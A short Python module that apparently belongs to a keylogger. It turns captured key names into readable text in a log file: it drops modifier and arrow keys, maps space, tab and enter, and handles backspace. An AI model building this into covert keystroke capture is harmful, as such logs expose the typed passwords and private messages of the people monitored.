from text_file_processors.file_io import append_file, read_and_write_file

EXCLUDED_KEYS = {"caps lock", "shift", "right shift", "ctrl", "right ctrl", "alt", "right alt", 
                 "up", "right", "down", "left", "home", "end", "page down", "page up", 
                 "delete", "print screen", "insert"}
SPACE_KEYS = {"space", "tab"}
BREAK_LINE_KEYS = {"enter"}

def format(message, log_save_location):
    if message not in EXCLUDED_KEYS:
        if message in SPACE_KEYS:
            append_file(" ", log_save_location)

        elif message in BREAK_LINE_KEYS:
            append_file("\n", log_save_location)

        elif message == "backspace":
            read_and_write_file(log_save_location)

        else:
            append_file(message, log_save_location)